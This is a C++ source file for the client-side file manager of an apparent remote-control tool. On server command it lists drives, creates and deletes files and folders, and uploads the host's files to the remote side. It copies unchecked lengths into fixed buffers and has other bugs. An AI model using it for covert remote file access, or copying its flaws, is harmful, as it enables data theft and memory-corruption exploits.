#include "stdafx.h"
#include "FileManager.h"


CFileManager::CFileManager(CClientSocket *pClient,UINT ID)
	:CManager(pClient)
{
	m_ID = ID;
	HEADER	SendCmd;
	SendCmd.flag = CLIENT_FILE_START;
	SendCmd.ID = m_ID;
	SendCmd.datalength = 0;
	
	Send((LPBYTE)&SendCmd, sizeof(HEADER));
	
	WaitForDialogOpen();

}
CFileManager::~CFileManager()
{

}
void CFileManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
	HEADER *pHeader = (HEADER*)lpBuffer;

	switch(pHeader->flag)
	{
	case SERVER_NEXT:
		NotifyDialogIsOpen();
		SendDriveList();
		break;
	case SERVER_FILE_LIST:
		SendFilesList(lpBuffer);
		break;
	case SERVER_DELETE_FILE:
		OnDeleteFile(lpBuffer);
		break;
	case SERVER_CREATE_FILE:
		OnCreateFile(lpBuffer);
		break;
	case SERVER_CREATE_FOLDER:
		OnCreateFolder(lpBuffer);
		break;
	case SERVER_DELETE_FOLDER:
		OnDeleteFolder(lpBuffer);
		break;
	case SERVER_DOWNLOAD_FILE:
		OnDownloadFile(lpBuffer);
		break;
	case SERVER_FILE_STOP:
		StopTransfer();
		break;
	case SERVER_FILE_CONTINUE:					 // 上传文件
		SendFileData(lpBuffer);
		break;
	case SERVER_DOWN_FILES:
		UploadToRemote(lpBuffer);
		break;
	default:
		break;
	}

}

UINT CFileManager::SendDriveList()
{
	HEADER header;
	header.flag	=	CLIENT_FILE_DRIVE_LIST;
	header.datalength = 256*2;
	wchar_t		DriveStr[256];

	GetLogicalDriveStrings(sizeof(DriveStr),DriveStr);
	PBYTE driverData = new BYTE[sizeof(HEADER)+header.datalength];
	memcpy(driverData,&header,sizeof(HEADER));
	memcpy(driverData+sizeof(HEADER),DriveStr,sizeof(DriveStr));

	UINT ret =	Send(driverData, sizeof(HEADER)+header.datalength);
	//delete driverData;
	return ret;	
}

void CFileManager::SendFilesList(LPBYTE recvData)
{
	HEADER *pHeader;
	pHeader = (HEADER*)recvData;
	PBYTE pPath = new BYTE[pHeader->datalength];
	memset(pPath,0,pHeader->datalength);
	memcpy(pPath,recvData+sizeof(HEADER),pHeader->datalength);

	HANDLE			hFile;
	FILE_LIST_DATA  fileFindData_send;
	fileFindData_send.header.ID = m_ID;
	fileFindData_send.header.flag = CLIENT_FILE_LIST;
	fileFindData_send.header.datalength = 10 * sizeof(WIN32_FIND_DATA);
	WIN32_FIND_DATA	FindFileData;
	
	wchar_t			strPath[MAX_PATH] = {0};
	memcpy(strPath,pPath,pHeader->datalength);
	wchar_t			addStr[] = _T("\\*.*");
	memcpy(strPath+pHeader->datalength/2,addStr,wcslen(addStr)*sizeof(addStr[0]));
	//wsprintf(strPath, _T("%s\\*.*"), pPath);
	hFile = FindFirstFile(strPath,&FindFileData);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		HEADER headerNull;
		headerNull.ID = m_ID;
		headerNull.flag = CLIENT_FILE_LIST;
		Send((LPBYTE)&headerNull,sizeof(HEADER));
		return;
	}
	int countFlag = 0; //each 10 data send one packet;
	do 
	{
		
		fileFindData_send.findData[countFlag] = FindFileData;
		if (countFlag == 9)
		{
			Send((LPBYTE)&fileFindData_send,sizeof(FILE_LIST_DATA));
			fileFindData_send.Clear();
			countFlag = 0;
			continue;
		}
		countFlag += 1;

	} while (FindNextFile(hFile, &FindFileData));

	Send((LPBYTE)&fileFindData_send,sizeof(FILE_LIST_DATA));
	return;
	
}

void CFileManager::OnCreateFolder(LPBYTE recvData)
{
	HEADER *pHeader;
	pHeader = (HEADER*)recvData;
	PBYTE folder = new BYTE[pHeader->datalength+2];
	memset(folder,0,pHeader->datalength+2);
	memcpy(folder,recvData+sizeof(HEADER),pHeader->datalength+2);
	wchar_t* pName = (wchar_t*)folder;
	HEADER header;
	header.ID = m_ID;
	if(!CreateDirectory(pName,NULL))
	{
		header.flag = CLIENT_CREATE_FOLDER_FAILED;
	}
	header.flag = CLIENT_CREATE_FOLDER_FINISH;
	Send((LPBYTE)&header,sizeof(HEADER));

	return;
}
void CFileManager::OnDeleteFolder(LPBYTE recvData)
{
	HEADER *pHeader;
	pHeader = (HEADER*)recvData;
	PBYTE folder = new BYTE[pHeader->datalength+2];
	memset(folder,0,pHeader->datalength+2);
	memcpy(folder,recvData+sizeof(HEADER),pHeader->datalength+2);
	wchar_t* pName = (wchar_t*)folder;

	HEADER header;
	header.ID = m_ID;

	if(!DeleteDic(pName))
	{
		header.flag = CLIENT_DELETE_FOLDER_FAILED;
		Send((LPBYTE)&header,sizeof(HEADER));
		return;
	}
	header.flag = CLIENT_DELETE_FOLDER_FINISH;
	Send((LPBYTE)&header,sizeof(HEADER));
	return;
}
bool CFileManager::DeleteDic(wchar_t* pDic)
{
	
    wchar_t sTempFileFind[ _MAX_PATH ] = { 0 }; 
    wsprintf(sTempFileFind,_T("%s//*.*"),pDic); 
	WIN32_FIND_DATA	FindFileData;
	HANDLE			hFile;

	hFile = FindFirstFile(sTempFileFind,&FindFileData);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		if(!RemoveDirectory(pDic))
		{
			return FALSE;
		}
		return TRUE;
	}
	do 
	{
		if (!lstrcmp(FindFileData.cFileName,_T(".")) || !lstrcmp(FindFileData.cFileName,_T("..")) )
			continue;
		if (FindFileData.dwFileAttributes == FILE_ATTRIBUTE_DIRECTORY)
		{
			wchar_t sTempDir[ _MAX_PATH ] = { 0 }; 
			wsprintf(sTempDir,_T("%s//%s"),pDic,FindFileData.cFileName); 
			if (!DeleteDic(sTempDir))
				return FALSE;
		}
		wchar_t sTempFileName[ _MAX_PATH ] = { 0 };
		wsprintf(sTempFileName,_T("%s//%s"),pDic,FindFileData.cFileName); 
		if(!DeleteFile(sTempFileName))
		{
			return FALSE;
		}
	} while (FindNextFile(hFile, &FindFileData));

	if(!RemoveDirectory(pDic))
	{
		return FALSE;
	}
	return TRUE;

}

void CFileManager::OnDeleteFile(LPBYTE recvData)
{
	HEADER *pHeader;
	pHeader = (HEADER *)recvData;
	PBYTE filename = new BYTE[pHeader->datalength+2];
	memset(filename,0,pHeader->datalength+2);
	memcpy(filename,recvData+sizeof(HEADER),pHeader->datalength);
	wchar_t* pName = (wchar_t*)filename;
	HEADER header;
	header.ID = m_ID;
	if(!DeleteFile(pName))
	{
		header.flag = CLIENT_DLELE_FILE_FAILED;
		Send((LPBYTE)&header,sizeof(HEADER));
		return;
	}
	
	header.flag = CLIENT_DLELE_FILE_FINISH;
	Send((LPBYTE)&header,sizeof(HEADER));
	return;
}

void CFileManager::OnCreateFile(LPBYTE recvData)
{
	HEADER *pHeader;
	pHeader = (HEADER *)recvData;
	PBYTE filename = new BYTE[pHeader->datalength+2];
	memset(filename,0,pHeader->datalength+2);
	memcpy(filename,recvData+sizeof(HEADER),pHeader->datalength);
	wchar_t* pName = (wchar_t*)filename;
	HEADER header;
	header.ID = m_ID;
	if (!CreateFile(pName,STANDARD_RIGHTS_ALL,FILE_SHARE_READ,NULL,CREATE_NEW,NULL,NULL))
	{
		header.flag = CLIENT_CREATE_FILE_FAILED;
		Send((LPBYTE)&header,sizeof(HEADER));
		return;
	}
	header.flag = CLIENT_CREATE_FILE_FINISH;
	Send((LPBYTE)&header,sizeof(HEADER));
	return;
}



bool CFileManager::OnDownloadFile(LPBYTE recvData)
{
	HEADER *pHeader;
	pHeader = (HEADER *)recvData;
	PBYTE filename = new BYTE[pHeader->datalength+2];
	memset(m_sendFileName,0,pHeader->datalength+2);
	memcpy(m_sendFileName,recvData+sizeof(HEADER),pHeader->datalength);
	if (m_sendFileName[lstrlen(m_sendFileName) - 1] == '\\')
	{
		FixedUploadList(m_sendFileName);
		if (m_UploadList.empty())
		{
			StopTransfer();
			return true;
		}
	}
	else
	{

		m_UploadList.push_back(m_sendFileName);
	}

	list <wstring>::iterator it = m_UploadList.begin();
	// 发送第一个文件
	SendFileSize((*it).c_str());

	return true;
}
void CFileManager::StopTransfer()
{
	if (!m_UploadList.empty())
		m_UploadList.clear();
	SendToken(CLIENT_TRANSFER_FINISH);
}
int CFileManager::SendToken(int bToken)
{
	HEADER hea;
	hea.ID = m_ID;
	hea.flag = bToken;
	return Send((LPBYTE)&hea,sizeof(HEADER));
}
bool CFileManager::FixedUploadList(LPCTSTR lpPathName)
{
	WIN32_FIND_DATA	wfd;
	wchar_t	lpszFilter[MAX_PATH];
	wchar_t	*lpszSlash = NULL;
	memset(lpszFilter, 0, sizeof(lpszFilter));

	if (lpPathName[lstrlen(lpPathName) - 1] != '\\')
		lpszSlash = _T("\\");
	else
		lpszSlash = _T("");

	wsprintf(lpszFilter, _T("%s%s*.*"), lpPathName, lpszSlash);


	HANDLE hFind = FindFirstFile(lpszFilter, &wfd);
	if (hFind == INVALID_HANDLE_VALUE) // 如果没有找到或查找失败
		return false;

	do
	{
		if (wfd.cFileName[0] != '.')
		{
			if (wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
			{
				wchar_t strDirectory[MAX_PATH];
				wsprintf(strDirectory, _T("%s%s%s"), lpPathName, lpszSlash, wfd.cFileName);
				FixedUploadList(strDirectory);
			}
			else
			{
				wchar_t strFile[MAX_PATH];
				wsprintf(strFile, _T("%s%s%s"), lpPathName, lpszSlash, wfd.cFileName);
				m_UploadList.push_back(strFile);
			}
		}
	} while (FindNextFile(hFind, &wfd));

	FindClose(hFind); // 关闭查找句柄
	return true;
}

UINT CFileManager::SendFileSize(LPCTSTR lpszFileName)
{
	UINT	nRet = 0;
	DWORD	dwSizeHigh;
	DWORD	dwSizeLow;
	// 1 字节token, 8字节大小, 文件名称, '\0'
	HANDLE	hFile;
	// 保存当前正在操作的文件名
	memset(m_strCurrentProcessFileName, 0, sizeof(m_strCurrentProcessFileName));
	lstrcpy(m_strCurrentProcessFileName, lpszFileName);

	hFile = CreateFile(lpszFileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	if (hFile == INVALID_HANDLE_VALUE)
		return FALSE;
	dwSizeLow =	GetFileSize(hFile, &dwSizeHigh);
	CloseHandle(hFile);
	// 构造数据包，发送文件长度
	int		nPacketSize = sizeof(wchar_t)*(lstrlen(lpszFileName)+2) + sizeof(FILESIZE) +sizeof(HEADER);
	BYTE	*bPacket = (BYTE *)LocalAlloc(LPTR, nPacketSize);
	memset(bPacket, 0, nPacketSize);
	// add header
	HEADER	 *pHeader	= (HEADER *)bPacket;
	pHeader->ID = m_ID;
	pHeader->flag = CLIENT_FILE_SIZE;
	pHeader->datalength = nPacketSize - sizeof(HEADER);
	// add file size
	FILESIZE *pFileSize = (FILESIZE *)(bPacket + sizeof(HEADER));
	pFileSize->dwSizeHigh = dwSizeHigh;
	pFileSize->dwSizeLow = dwSizeLow;
	// add file name .
	memcpy(bPacket + sizeof(HEADER) + sizeof(FILESIZE), lpszFileName, sizeof(wchar_t)*lstrlen(lpszFileName) + 2);

	nRet = Send(bPacket, nPacketSize);
	LocalFree(bPacket);
	return nRet;
}


UINT CFileManager::SendFileData(LPBYTE lpBuffer)
{
	UINT		nRet;
	FILESIZE	pFileSize;
	wchar_t		*lpFileName;
	HEADER		*pHeader = (HEADER *)lpBuffer;
	memset(&pFileSize,0,sizeof(FILESIZE));
	memcpy(&pFileSize,lpBuffer+sizeof(HEADER),sizeof(FILESIZE));
	
	lpFileName = m_strCurrentProcessFileName;

	// 远程跳过，传送下一个
	if (pFileSize.dwSizeLow == -1)
	{
		UploadNext();
		return 0;
	}
	HANDLE	hFile;
	hFile = CreateFile(lpFileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	if (hFile == INVALID_HANDLE_VALUE)
		return -1;

	SetFilePointer(hFile, pFileSize.dwSizeLow, (long *)&(pFileSize.dwSizeHigh), FILE_BEGIN);

	int		nHeadLength = sizeof(HEADER) + sizeof(FILESIZE); //  4 + 4数据包头部大小
	DWORD	nNumberOfBytesToRead = MAX_SEND_BUFFER - nHeadLength;
	DWORD	nNumberOfBytesRead = 0;

	LPBYTE	lpPacket = (LPBYTE)LocalAlloc(LPTR, MAX_SEND_BUFFER);
	// Token,  大小，偏移，文件名，数据
	HEADER  *pheader = (HEADER *)lpPacket;
	pheader->ID = m_ID;
	pheader->flag	=	CLIENT_FILE_DATA;
	
	memcpy(lpPacket + sizeof(HEADER), &pFileSize, sizeof(FILESIZE));
	ReadFile(hFile, lpPacket + nHeadLength, nNumberOfBytesToRead, &nNumberOfBytesRead, NULL);
	CloseHandle(hFile);


	if (nNumberOfBytesRead > 0)
	{
		pheader->datalength = nNumberOfBytesRead;
		int	nPacketSize = nNumberOfBytesRead + nHeadLength;
		nRet = Send(lpPacket, nPacketSize);
	}
	else
	{
		UploadNext();
	}

	LocalFree(lpPacket);

	return nRet;
}

// 传送下一个文件
void CFileManager::UploadNext()
{
	list <wstring>::iterator it = m_UploadList.begin();
	// 删除一个任务
	m_UploadList.erase(it);
	// 还有上传任务
	if(m_UploadList.empty())
	{
		SendToken(CLIENT_TRANSFER_FINISH);
	}
	else
	{
		// 上传下一个
		it = m_UploadList.begin();
		SendFileSize((*it).c_str());
	}
}


bool CFileManager::UploadToRemote(LPBYTE lpBuffer)
{
	HEADER *pHeader;
	pHeader = (HEADER *)lpBuffer;
	wchar_t* filename = new wchar_t[pHeader->datalength+2];
	memset(filename,0,pHeader->datalength+2);
	memcpy(filename,lpBuffer+sizeof(HEADER),pHeader->datalength);
	if (filename[lstrlen(filename) - 1] == '\\')
	{
		FixedUploadList(filename);
		if (m_UploadList.empty())
		{
			StopTransfer();
			return true;
		}
	}
	else
	{
		m_UploadList.push_back(filename);
	}

	list <wstring>::iterator it = m_UploadList.begin();
	// 发送第一个文件
	SendFileSize((*it).c_str());

	return true;
}
